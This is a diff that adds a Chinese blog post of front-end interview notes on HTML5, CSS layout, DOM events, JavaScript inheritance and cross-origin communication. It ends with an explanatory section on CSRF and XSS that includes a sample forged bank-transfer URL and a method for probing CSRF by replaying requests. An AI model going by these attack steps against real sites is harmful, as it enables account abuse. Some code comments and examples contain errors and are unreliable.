@@ -1,0 +1,1584 @@
+---
+layout:     post
+title:      "前端面试"
+date:       2018-02-25 12:54:00
+author:     "Qz"
+header-img: "img/post-bg-2015.jpg"
+catalog: true
+tags:
+    - 面试
+---
+
+> “Yeah It's on. ”
+
+
+## HTML5类
+
+### 语义化标签
+
+引入语义化标签的优点：
+1. 比`<div>`标签有更加丰富的含义，方便开发与维护
+2. 搜索引擎能更方便的识别页面的每个部分
+3. 方便其他设备解析（如移动设备、盲人阅读器等）
+
+所谓语义化标签就是一种我们仅通过标签名就能判断出该标签内容的语义的标签
+如：`<article>,<section>,<nav>,<aside>,<header>,<footer>`
+
+**header**
+通常被放置在页面或者页面中某个区块元素的顶部，包含整个页面或者区块的标题、简介等信息，起到引导与导航的作用。
+
+
+我们不但可以放置页面或者页面中某个区块的标题，还可以放置搜索表单、logo图片等元素，按照最新的W3C标准，我们还可以放置`<nav>`导航栏。
+
+**nav**
+表示页面的导航，可以通过导航连接到网站的其他页面，或者当前页面的其它部分。
+
+
+`<nav>`不但可以作为页面独立的导航区域存在，我们还可以`<header>`标签中使用。此外，`<nav>`标签还可以显示在侧边栏中。由此可见，一个页面之中可以有多个`<nav>`标签。
+
+
+根据HTML5标准，`<nav>`标签只用于页面的主要导航部分。因为搜索引擎或者屏幕阅读器会根据`<nav>`标签来确定网站的主体内容，所以并不是任意一组超链接都适合放置在`<nav>`标签中,我们只要将主要的，基本的链接组放进`<nav>`即可,对于有辅助性的页脚链接则不推荐使用`<nav>`标签。
+
+>HTML5规范不允许将`<nav>`标签嵌套在`<address>`标签中使用。
+
+**aside**
+所包含的内容不是页面的主要内容、具有独立性，是对页面的补充。
+
+`<aside>`标签一般使用在页面、文章的侧边栏、广告、友情链接等区域。
+
+
+**footer**
+一般被放置在页面或者页面中某个区块的底部，包含版权信息、联系方式等信息。
+
+跟`<header>`标签一样，`<footer>`标签的使用个数没有限制，可以在任意需要的区块底部使用。
+
+
+**article**
+表示包含于一个文档、页面、应用程序或网站中的一段独立的内容，可以被独立的发布或者重新使用文章标记标签。
+
+`<article>`标签应该使用在相对比较独立、完整的的内容区块，所以我们可以在一篇博客、一个论坛帖子、一篇新闻报道或者一个用户评论中使用它。通常情况下，一个`<article>`元素包括标题、正文和脚注。和`<nav>`标签一样，该标签同样不能用在`<address>`标签中；
+
+>`<article>`标签还可以嵌套使用，但是它们必须是部分与整体的关系
+
+
+**section**
+是一个主题性的内容分组，**通常用于对页面进行分块或者对文章等进行分段**
+
+`<section>`标签所包裹的是有一组相似的主题的内容，可以用这个标签来实现文章的章节、标签式对话框中的各种标签页等类似的功能。
+
+`<section>`通常包含一个头部`<header>`、可能还会包含一个尾部`<footer>`。
+
+`<div> <section> <article>`三者的比较：
+* `<div>`：应用广泛，只要我们想为一个区域定义一个样式或者为其添加JS行为，就可以使用div标签
+* `<section>`：包含的内容是一个明确的主题，通常有标题区域
+* `<article>`:如果我们的页面中需要一个单独的模块来实现一个单独的功能，就用`<article>`，其他的时候都用`<section>`。
+
+
+## 页面布局类
+
+### 经典三栏布局
+[代码地址](https://github.com/QinZhen001/front-end-demo/blob/master/three-column-layout/three-column-layout.html)
+
+出现的问题：
+当屏幕width过小时，中间部分的文字会跑到左边(例如：当采取float解决方案时)
+
+>这里是因为元素被浮动元素覆盖(但是文本信息不会被浮动元素所覆盖)，想要避免，可以将中间部分改为BFC 特性
+
+
+**当屏幕width过小时,中间部分挤压变高，如果是flexbox解决方案，左右部分也会跟着变高，这就也是为什么推荐尽可能使用flex布局的原因之一。**
+
+### BFC
+[网站链接](https://zhuanlan.zhihu.com/p/25321647)
+
+Formatting context(格式化上下文) 是 W3C CSS2.1 规范中的一个概念。它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。
+
+
+BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于普通流 (normal flow)
+
+**具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。**
+
+通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。
+
+#### 触发 BFC
+* body 根元素
+* 浮动元素：float 除 none 以外的值
+* 绝对定位元素：position (absolute、fixed)
+* display 为 inline-block、table-cell、flex
+* overflow 除了 visible 以外的值 (hidden、auto、scroll)
+
+
+
+#### BFC 特性及应用
+**1.同一个 BFC 下外边距会发生折叠**
+```
+<head>
+div{
+    width: 100px;
+    height: 100px;
+    background: lightblue;
+    margin: 100px;
+}
+</head>
+<body>
+    <div></div>
+    <div></div>
+</body>
+```
+
+![enter description here][1]
+
+
+从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px。
+
+如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。
+```
+<div class="container">
+    <p></p>
+</div>
+<div class="container">
+    <p></p>
+</div>
+.container {
+    overflow: hidden;
+}
+p {
+    width: 100px;
+    height: 100px;
+    background: lightblue;
+    margin: 100px;
+}
+```
+这时候，两个盒子边距就变成了 200px 
+
+
+![enter description here][2]
+
+**2.BFC 可以包含浮动的元素（清除浮动）**
+我们都知道，浮动的元素会脱离普通文档流
+```
+<div style="border: 1px solid #000;">
+    <div style="width: 100px;height: 100px;background: #eee;float: left;">
+    </div>
+</div>
+```
+![enter description here][3]
+
+由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。
+
+```
+<div style="border: 1px solid #000;overflow: hidden">
+    <div style="width: 100px;height: 100px;background: #eee;float: left;">
+    </div>
+</div>
+```
+
+![enter description here][4]
+
+
+**3. BFC 可以阻止元素被浮动元素覆盖**
+先来看一个文字环绕效果：
+
+```
+<div style="height: 100px;width: 100px;float: left;background: lightblue">我是一个左浮动的元素
+</div>
+<div style="width: 200px; height: 200px;background: #eee">我是一个没有设置浮动, 
+也没有触发 BFC 元素, width: 200px; height:200px; background: #eee;
+</div>
+```
+
+这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，可触第二个元素的 BFC 特性，在第二个元素中加入 overflow: hidden，就会变成：
+
+![enter description here][5]
+
+>这个方法可以用来实现两列自适应布局，效果不错，这时候左边的宽度固定，右边的内容自适应宽度(去掉上面右边内容的宽度)。
+
+
+### 用纯CSS创建一个三角形
+```
+width: 0;
+height: 0;
+border-top: 40px solid transparent;
+border-left: 40px solid transparent;
+border-right: 40px solid transparent;
+border-bottom: 40px solid #ff0000;
+```
+
+### 为什么margin:auto可以让块级元素水平居中
+这是因为水平方向的 auto，其计算值取决于可用空间（剩余空间）。
+**但是，注意display:inline-block和margin:auto同时出现时元素无法居中**
+
+
+### 品字布局
+```
+		<style type="text/css">
+	
+			.container {
+				text-align: center;
+				font-size: 0;
+			}
+			.top {
+				width: 200px;
+				height: 200px;
+				margin: 0 auto;
+				background: #FF0000;
+			}
+			.bottom-left,
+			.bottom-right {
+				width: 200px;
+				height: 200px;
+				display: inline-block;
+				margin: 0 auto;
+			}
+			.bottom-left {
+				background: aqua;
+			}
+			.bottom-right {
+				background: #0000FF;
+			}
+		</style>
+	<body>
+		<div class="container">
+			<div class="top">
+			</div>
+			<div class="bottom-left">
+			</div>
+			<div class="bottom-right">
+			</div>
+		</div>
+	</body>
+```
+
+### containing block
+想想浏览器怎么把一个元素“画”出来，至少要知道定位和尺寸。定位有三种normal flow, floats和absolute，无论属于哪种首先要找所在的containing block(我翻译为容器块)，相当于一个大箱子里摆很多小盒子，小盒子怎么摆取决于大箱子。
+
+怎么确定一个元素的containing block，由position属性确定：
+1. static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分）
+2. absolute: 向上找最近的定位为absolute/relative的元素
+3. fixed: 它的containing block一律为根元素(html/body)，根元素也是initial containing block
+
+
+###  position跟display、overflow、float这些特性相互叠加后会怎么样？
+display属性规定元素应该生成的框的类型；position属性规定元素的定位类型；float属性是一种布局方式，定义元素在哪个方向浮动。
+
+类似于优先级机制：position：absolute/fixed优先级最高，有他们在时，float不起作用，display值需要调整。**float 或者absolute定位的元素，只能是块元素或表格。**
+
+### box-sizing属性
+用来控制元素的盒子模型的解析模式，默认为content-box
+* context-box：W3C的标准盒子模型，设置元素的 height/width 属性指的是content部分的高/宽
+* border-box：IE传统盒子模型。设置元素的height/width属性指的是border + padding + content部分的高/宽
+
+### 清除浮动的方式
+* 父级div定义height
+* 最后一个浮动元素后加空div标签 并添加样式clear:both。
+* 包含浮动元素的父标签添加样式overflow为hidden或auto。
+* 父级div定义zoom:1
+* 父级div定义伪类:after{display:block;clear:both;content:"";visibility:hidden;height:0}
+
+
+### 在网页中的应该使用奇数还是偶数的字体？
+使用偶数字体。偶数字号相对更容易和 web 设计的其他部分构成比例关系。Windows 自带的点阵宋体(中易宋体)从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px时用的是小一号的点。(即每个字占的空间大了 1 px，但点阵没变)，于是略显稀疏。
+
+
+###  元素竖向的百分比设定是相对于容器的高度吗？
+当按百分比设定一个元素的宽度时，它是相对于父容器的宽度计算的，但是，对于一些表示竖向距离的属性，例如 padding-top , padding-bottom , margin-top , margin-bottom 等，当按百分比设定它们时，**依据的也是父容器的宽度，而不是高度**。
+
+
+### 全屏滚动的原理是什么
+原理：有点类似于轮播，整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过margin-top实现
+`verflow：hidden；transition：all 1000ms ease；`
+
+
+### 伪类与伪元素
+伪类如：:focus,:hover,:link,:visited
+伪元素如：::before,::after
+
+
+特性及其区别：
+* 伪类本质上是为了弥补常规CSS选择器的不足，以便获取到更多信息；
+* 伪元素本质上是创建了一个有内容的虚拟容器；
+* CSS3中伪类和伪元素的语法不同；
+* 可以同时使用多个伪类，而只能同时使用一个伪元素；
+
+>在CSS3中，单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。
+
+
+### 利用line-height使单行文本垂直居中
+行高是指一行文字的高度，具体说是两行文字间基线的距离。CSS中起高度作用的是height和line-height，没有定义height属性，最终其表现作用一定是line-height。
+
+单行文本垂直居中：把line-height值设置为height一样大小的值可以实现单行文字的垂直居中，
+
+### 有一个高度自适应的div，里面有两个div，一个高度100px，希望另一个填满剩下的高度
+外层div使用position：relative；高度要求自适应的div使用position: absolute; top: 100px; bottom: 0; left: 0
+
+### CSS Sprites
+将一个页面涉及到的所有图片都包含到一张大图中去，然后利用CSS的 background-image，background- repeat，background-position 的组合进行背景定位。利用CSS Sprites能很好地减少网页的http请求，从而大大的提高页面的性能；CSS Sprites能减少图片的字节。
+
+## DOM事件类
+
+### 事件级别
+
+| DOM0 | element.onclick = function(){}                                           |
+| ---- | ------------------------------------------------------------------------ |
+| DOM2 | element.addEventListener('click',function(){},false)                     |
+| DOM3 | element.addEventListener('keyup',function(){},false)(事件类型增加了很多) |
+
+
+>addEventListener()的第三个参数
+>* true - 事件句柄在捕获阶段执行
+>* false- 默认。事件句柄在冒泡阶段执行
+
+
+### 描述DOM事件捕获的具体流程
+window -> document -> html -> body -> ... -> 目标元素
+
+### Event对象的常见应用
+* event.preventDefault()
+* event.stopPropagation() //阻止冒泡
+* event.stopImmediatePropagation() 
+* event.currentTarget //返回绑定事件的元素(和this 的作用是差不多的)
+* event.target //当前被触发的元素
+
+#### event.stopImmediatePropagation() 
+如果某个元素有多个相同类型事件的事件监听函数,则当该类型的事件触发时,多个事件监听函数将按照顺序依次执行.如果某个监听函数执行了 event.stopImmediatePropagation()方法,则除了该事件的冒泡行为被阻止之外(event.stopPropagation方法的作用),该元素绑定的后序相同类型事件的监听函数的执行也将被阻止.
+
+#### event.currentTarget用来事件委托(事件代理)
+target事件委托的定义：本来该自己干的事，但是自己不干，交给别人来干。一般用到for循环遍历节点添加事件的时候都可以用事件委托来做，可以提高性能。
+
+```
+<input type="text" id="text">
+    <input type="button" value="添加" id="button">
+    <ul>
+        <li>第1个<button class="btn" id="1">删除</button></li>
+        <li>第2个<button class="btn" id="2">删除</button></li>
+        <li>第3个<button class="btn" id="3">删除</button></li>
+    </ul>
+    <script>
+            var button = document.getElementById("button");
+            var text = document.getElementById("text");
+            var ul = document.getElementsByTagName("ul")[0];
+            var btnClass = document.getElementsByClassName("btn");        
+        button.onclick = function(){
+            var deleteButton = document.createElement("button");    
+            var value = text.value;
+                deleteButton.setAttribute("class","btn");
+            var deleteText = document.createTextNode("删除");
+                deleteButton.appendChild(deleteText);
+            var li = document.createElement("li");
+            var liText = document.createTextNode(value);
+                li.appendChild(liText);
+                li.appendChild(deleteButton);
+                ul.appendChild(li);
+            for(var i=0;i<btnClass.length;i++){
+                btnClass[i].onclick=function(){
+                this.parentNode.parentNode.removeChild(this.parentNode);
+            }
+        }
+        }
+
+            for(var i=0;i<btnClass.length;i++){
+                btnClass[i].onclick=function(){
+                    this.parentNode.parentNode.removeChild(this.parentNode);
+                }
+            }
+    </script>
+```
+
+
+为什么在button.onclick里面也需要一个for循环，给每个删除按钮添加事件呢？因为外面的for循环，在文档刷新时给页面中存在的三个删除按钮添加了点击事件，而后来添加的删除按钮并没有绑定事件，导致页面中存在的三个li标签可以删除，而后来新添加的li不能删除这个问题。我们使用事件委托来做就不用这么麻烦了
+
+```
+<script>
+            var button = document.getElementById("button");
+            var text = document.getElementById("text");
+            var ul = document.getElementsByTagName("ul")[0];
+            var btnClass = document.getElementsByClassName("btn");        
+        button.onclick = function(){
+            var deleteButton = document.createElement("button");    
+            var value = text.value;
+                deleteButton.setAttribute("class","btn");
+            var deleteText = document.createTextNode("删除");
+                deleteButton.appendChild(deleteText);
+            var li = document.createElement("li");
+            var liText = document.createTextNode(value);
+                li.appendChild(liText);
+                li.appendChild(deleteButton);
+                ul.appendChild(li);
+            }
+            ul.onclick = function(event){
+                var tar = event.target;
+                if(tar.nodeName.toLowerCase() == "button"){
+                    tar.parentNode.parentNode.removeChild(tar.parentNode);
+                }
+            }
+</script>
+```
+
+给ul添加了点击事件，点击ul里面的子元素，event.target都会返回当前点击的元素节点，做一个判断，如果点击了button标签，删除这个li节点。由于添加的li都在ul节点里面，所以并不用再去添加li事件里面去写代码了
+
+
+>* event.target.nodeName  　　//获取事件触发元素标签name(全大写)
+>* event.target.id　　　　　　　//获取事件触发元素id
+>* event.target.className　　//获取事件触发元素classname
+>* event.target.innerHTML　　//获取事件触发元素的内容
+
+
+
+### 自定义事件
+```
+var eve = new Event('custome')
+
+element.addEventListener('custome',function(){
+    console.log('custome')
+})
+element.dispatchEvent(eve)
+```
+
+
+## 面向对象类
+
+### new运算符
+
+>foo为构造函数
+1. 一个对象被创建。**它继承foo.prototype**
+2. 构造函数foo被执行。执行时，相应的参数会被传入，同时上下文(this)会被指定为这个新实例(也就是步骤1创建的对象)。**new foo等同于new foo(),只能用在不传递任何参数的情况。**
+3. 如果构造函数返回了一个"对象"，那么这个对象会取代整个new出来的结果。如果构造函数没有返回对象，那么new出来的结果为步骤1创建的对象。
+
+
+----------
+
+var a = new A()
+显而易见， 对象a是继承于A.prototype的， 那么A.prototype这个自动生成的对象，又是从哪出来的呢？
+
+答案是： A.prototype 这个对象是Object和Object.prototype的产物， 当我们
+function A() {
+    
+}
+的时候， 系统后台调用new Object()这样生成了对象A.prototype， 另外A.prototype这个函数会自带一个属性construcor，这个属性的值是函数A
+
+
+
+### 原型和原型链
+**所有的引用类型（数组、对象、函数），都有一个__proto__属性，属性值是一个普通的对象**
+
+**所有的函数，都有一个 prototype 属性，属性值也是一个普通的对象**
+
+所有的引用类型（数组、对象、函数），`__proto__`属性值指向它的构造函数的 ”prototype“ 属性值
+
+当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的 `__proto__`（即它的构造函数的prototype）中寻找。
+
+![enter description here][6]
+
+举个栗子:
+```
+    var obj = {};
+    obj.a = 100;
+    var arr = [];
+    arr.a = 100;
+    function fn() {
+    }
+    fn.a = 100;
+
+    console.log(obj.__proto__); //Object{}
+    console.log(arr.__proto__); //[Symbol(Symbol.unscopables):Object]
+    console.log(fn.__proto__); //function(){}
+    console.log(fn.prototype); //Object{}
+    console.log(obj.__proto__ === Object.prototype) //true
+```
+
+
+----------
+
+```
+   // 构造函数
+    function Foo(name, age) {
+        this.name = name
+    }
+
+    Foo.prototype.alertName = function () {
+        alert(this.name)
+    };
+    //创建事例
+    var f = new Foo('zhangsan')
+    f.printName = function () {
+        console.log(this.name)
+    };
+    // 测试
+    f.printName();
+    f.alertName();
+```
+
+
+----------
+
+
+```
+    //动物
+    function Animal() {
+        this.eat = function () {
+            console.log('animal eat');
+        }
+    }
+    // 狗
+    function Dog() {
+        this.bark = function () {
+            console.log('dog bark')
+        }
+    }
+    Dog.prototype = new Animal();
+    // 哈士奇
+    var hashiqi = new Dog()
+```
+
+
+
+
+### 创建对象的三种方式
+1. 字面量
+var o1 = {name:"o1"}
+2. 构造函数
+var M = function(name){
+    this.name = name
+}
+var o2 = new M("o2")
+3. Object.create
+var p = {name:"p"}
+var o3 = Object.create(p)
+
+**o3.\_\_proto === p 
+p是o3的原型对象
+o3本身自己是空对象，并没有name属性**
+
+### Object.create 和new区别(扩展)
+
+[网页链接](http://blog.csdn.net/blueblueskyhua/article/details/73135938)
+
+Object.create 创建的对象是用原型链来连接的
+
+Object.create的实现方式：
+```
+Object.create =  function (o) {
+    var F = function () {};
+    F.prototype = o;
+    return new F();
+};
+```
+
+**这种方法比"构造函数法"简单，但是不能实现私有属性和私有方法，实例对象之间也不能共享数据，对"类"的模拟不够全面。**
+
+可以看出来。Object.create是内部定义一个对象，并且让F.prototype对象 赋值为引进的对象/函数 o，并return出一个新的对象。
+
+简单实现new:
+```
+var new2 = function(func){
+    var o = Object.create(func.prototype)
+    var k = func.call(o) //转移上下文 this指向o实例
+    if(typeof k === 'object'){
+        return k
+    }else{
+        return o
+    }
+}
+```
+
+
+### instanceof和constructor
+用到instanceof和constructor来检测某个对象是不是另一个对象的实例
+```
+var M = function(name){
+    this.name = name
+}
+var o3 = new M("o3")
+```
+
+o3.\_\_proto__ == M.prototype
+M.prototype.\_\_proto__ === Object.prototype
+
+**所以o3 instanceof Object     //true**
+
+nstanceof 可以在继承关系中用来判断一个实例是否属于它的父类型,**在多层继承关系中，instanceof 运算符同样适用**。
+
+这样并不好，因为这样无法判断出是否是继承关系中的直接父类
+
+所以我们可以使用 constructor
+
+**o3.\_\_proto__.constructor === M  //true
+o3.\_\_proto__.constructor === Object //false**
+
+
+### 借助构造函数实现继承
+```
+function Parent1(){
+    this.name = 'parent1'
+}
+
+function Child1(){
+    Parent1.call(this) //在此处改变上下文执行Parent1 this是Child1实例对象
+    this.type = 'child1'
+}
+
+console.log(Child1())
+```
+**缺点：Parent1原型链上的东西并没有被Child1继承**
+
+
+### 借助原型链实现继承
+```
+function Parent2(){
+    this.name = 'parent2'
+    this.play = [1,2,3]
+}
+function Child2(){
+    this.type = 'child2'
+}
+Child2.prototype = new Parent2()
+```
+
+
+```
+var s1 = new Child2()
+var s2 = new Child2()
+s1.play.push(4)
+//s1.play  [4,1,2,3]
+//s2.play  [4,1,3,4]
+```
+**缺点：子类共用原型链中的原型对象**
+
+### 借助组合方式实现继承
+```
+function Parent3(){
+    this.name = 'parent3'
+    this.play = [1,2,3]
+}
+function Child3(){
+    Parent3.call(this)
+    this.type = 'child3'
+}
+Child3.prototype = new Parent3()
+```
+**缺点：父类的构造函数执行了两次**
+
+
+组合继承优化1：
+```
+function Parent4(){
+    this.name = 'parent4'
+    this.play = [1,2,3]
+}
+function Child4(){
+    Parent4.call(this)
+    this.type = 'child4'
+}
+Child4.prototype = Parent4.prototype
+```
+
+```
+var s5 = new Child4()
+var s6 = new Child4()
+console.log(s5 instanceof Child4,s5 instanceof Parent4)
+//true true
+```
+**缺点：无法区分对象是由子类直接实例化还是父类直接实例化**
+
+
+组合继承优化2：
+```
+function Parent5(){
+    this.name = 'parent5'
+    this.play = [1,2,3]
+}
+function Child5(){
+    Parent4.call(this)
+    this.type = 'child5'
+}
+Child5.prototype = Object.create(Parent5.prototype)
+Child5.prototype.constructor = Child5
+```
+**牛逼啊！！！**
+
+
+## 通信类
+
+### 同源
+* 协议
+* 域名
+* 端口
+
+
+三者**都要相同**，就是同源。
+
+同源策略限制从一个源加载的文件或脚本与来自另一个源的资源进行交互。
+
+
+### 前后端如何通信
+* Ajax(同源)
+* WebSocket
+* CORS
+
+### 如何创建Ajax
+* XMLHttpRequest对象的工作流程
+* 兼容性处理
+* 事件的触发条件
+* 事件的触发顺序
+
+
+### 跨域通信
+* JSONP(利用script标签的异步加载)
+* Hash(hash改变页面不会刷新)
+* postMessage
+* WebSocket
+* CORS
+
+
+
+#### postMessage
+postMessage是html5新增的一个解决跨域的一个方法
+
+postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。
+
+我们拿跨域中的iframe做例子
+```
+<script type="text/javascript">
+    window.parent.postMessage('hello world','*');   
+    //在被嵌套的iframe的页面中写入这样一段代码
+</script>
+```
+
+>window.parent返回当前窗口的父窗口。
+
+
+注意：postMessage的写法，postMessage之前写的是你要通信的window对象（也就是你要像谁通信），此时的window.parent的权限仅限于此，不能在像同域似的，进行获取父级的DOM元素，否则浏览器会报错，提示你不能进行跨域访问，我们再来看postMessage中所接收的参数，第一个参数就是你要像另外一个窗口传递的数据（只能传字符串类型），第二个参数表示目标窗口的源，协议+主机+端口号，是为了安全考虑，如果设置为“*”，则表示可以传递给任意窗口。
+```
+<script type="text/javascript">
+    window.addEventListener('message',function(e){
+        console.log(e.data);        //hello world
+        console.log(e.origin);      //http://127.0.0.1:8020 所传来数据的域
+
+    })
+</script>
+```
+
+
+## 安全类
+* CSRF
+* XSS
+
+### CSRF
+[网页链接](http://blog.csdn.net/stpeace/article/details/53512283)
+CSRF跨站点请求伪造(Cross—Site Request Forgery)
+
+
+攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。
+
+
+#### CSRF攻击攻击原理及过程如下：
+1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
+2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
+3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
+4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
+5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 
+
+
+
+#### CSRF漏洞检测：
+检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。
+
+随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。
+
+以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。
+
+#### 防御CSRF攻击：
+* 验证 HTTP Referer 字段；
+* 在请求地址中添加 token 并验证
+* 在 HTTP 头中自定义属性并验证。
+
+
+**验证 HTTP Referer 字段**：
+根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 `http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory`，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。
+
+这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
+
+然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。
+
+
+----------
+
+
+**在请求地址中添加 token 并验证:**
+CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
+
+
+这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 `http://url?csrftoken=tokenvalue`。 而对于 POST 请求来说，要在 form 的最后加上 `<input type=”hidden” name=”csrftoken” value=”tokenvalue”/>`，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。
+
+该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。
+
+
+----------
+
+
+**在 HTTP 头中自定义属性并验证**
+这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。
+
+
+然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。
+
+### XSS
+[网页链接](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651553616&idx=1&sn=17036b87c39e81cbcb8df5d9fb1f906d&chksm=8025a891b75221874054f9f71d40a94973b583e7a444c868c8f94fa76e1c9d8b3c29d68ee6a8&scene=0#rd)
+
+跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+
+
+反射型：
+URL的构成分为协议、域名、端口、路径、查询几部分构成。
+XSS往往在“查询”部分发现漏洞构造攻击代码实施攻击，所谓“反射”可以理解为hacker并不会直接攻击客户，而是通过URL植入代码通过服务器获取并植入到用户页面完成攻击。
+
+
+存储型：
+存储型存储型攻击方式和反射型最大的区别就是不通过URL来传播，而是利用站点本身合法的存储结构，比如评论。任何用户都可以通过站点提供的接口提交评论内容，这些评论内容都被存储到服务器的数据库。当用户访问这些评论的时候，服务器从数据库提取内容插入到页面反馈给用户。如果评论内容本身是具备攻击性内容，用户无一幸免。
+
+#### XSS的工作原理：
+不管是反射型还是存储型，服务端都会将JavaScript当做文本处理，这些文本在服务端被整合进html文档中，在浏览器解析这些文本的过程也就是XSS被执行的时候。
+
+从攻击到执行分为以下几步：
+1. 构造攻击代码
+2. 服务端提取并写入HTML
+3. 浏览器解析，XSS执行
+
